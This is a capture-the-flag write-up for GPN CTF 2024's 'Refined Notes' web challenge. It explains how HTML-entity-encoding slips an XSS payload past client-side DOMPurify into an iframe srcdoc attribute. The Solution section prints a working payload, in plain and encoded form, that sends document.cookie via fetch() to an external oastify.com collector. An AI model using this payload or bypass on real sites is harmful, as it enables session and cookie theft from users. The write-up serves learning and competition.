---
ctf-event: GPN CTF 2024
date: 2024-06-01
ctf-team: luxeria
ctf-task: Refined Notes
ctf-category: web
ctf-difficulty: 
---
# Refined Notes

## Description

> All my friends warned me about xss, so I created this note taking app that only accepts "refined" Notes.

## Analysis

The website has an input text field:
![](_attachments/Pasted%20image%2020240601003220.png)

On submit, the user input is sanitized client-side by DOMPurify and then sent to the server:
```js
submit.addEventListener('click', (e) => {
    const purified = DOMPurify.sanitize(note.value);
    fetch("/", {
        method: "POST",
        body: purified
    }).then(response => response.text()).then((id) => {
        window.history.pushState({page: ''}, id, `/${id}`);
        submit.classList.add('hidden');
        note.classList.add('hidden');
        noteframe.classList.remove('hidden');
        noteframe.srcdoc = purified;
    });
});
```

Example:
```http
POST / HTTP/1.1
Host: run-it--juelz-santana-7793.ctf.kitctf.de
[...]

ThisIsMyInput

HTTP/1.1 200 OK
[...]

0a9f3f23-03a6-4221-ae29-326adb83717d
```

The response returns a UUID for a new note. When this note is accessed, the user input is shown directly in the HTTP response in the `srcdoc` attribute of an `iframe` tag:
```http
GET /0a9f3f23-03a6-4221-ae29-326adb83717d HTTP/1.1
Host: run-it--juelz-santana-7793.ctf.kitctf.de
[...]

HTTP/1.1 200 OK
[...]

<!DOCTYPE html>
[...]
<iframe id="noteframe" class=" bg-white w-full px-3 py-2 border rounded-md h-60" srcdoc="ThisIsMyInput"></iframe>
[...]
```

Another endpoint accepts a note UUID which will be visited by an admin user:
![](_attachments/Pasted%20image%2020240601212925.png)

## Solution

The following payload could be used to read the cookie and exfiltrate it to an external system:
```html
<img src=x onerror="fetch('https://637nljzj6517nkhpr96kbngvfmld9axz.oastify.com' + '/?flag=' + document.cookie)">
```

This payload is however correctly sanitized. However, it's possible to use HTML encoded values inside the `srcdoc` attribute of the `iframe` tag. This can e.g. be converted using CyberChef:
```html
&lt;img src&equals;x onerror&equals;&quot;fetch&lpar;&apos;https&colon;&sol;&sol;637nljzj6517nkhpr96kbngvfmld9axz&period;oastify&period;com&apos; &plus; &apos;&sol;&quest;flag&equals;&apos; &plus; document&period;cookie&rpar;&quot;&gt;
```

Submit this payload:
```http
POST / HTTP/1.1
Host: run-it--juelz-santana-7793.ctf.kitctf.de
[...]

&lt;img src&equals;x onerror&equals;&quot;fetch&lpar;&apos;https&colon;&sol;&sol;637nljzj6517nkhpr96kbngvfmld9axz&period;oastify&period;com&apos; &plus; &apos;&sol;&quest;flag&equals;&apos; &plus; document&period;cookie&rpar;&quot;&gt;

HTTP/1.1 200 OK
[...]

a9e39bd7-e234-45ee-a2c2-bc388b58ff02
```

Sending this  UUID to the admin to let the admin visit the prepared note containing the XSS payload. When the admin visits this page,  a request will be sent to the server containing the cookie which is the flag:
```http
GET /?flag=flag=GPNCTF%7B3nc0d1ng_1s_th3_r00t_0f_4ll_3v1l%7D HTTP/1.1
Host: 637nljzj6517nkhpr96kbngvfmld9axz.oastify.com
[...]
```

## Resources

- https://github.com/apostrophecms/sanitize-html/issues/217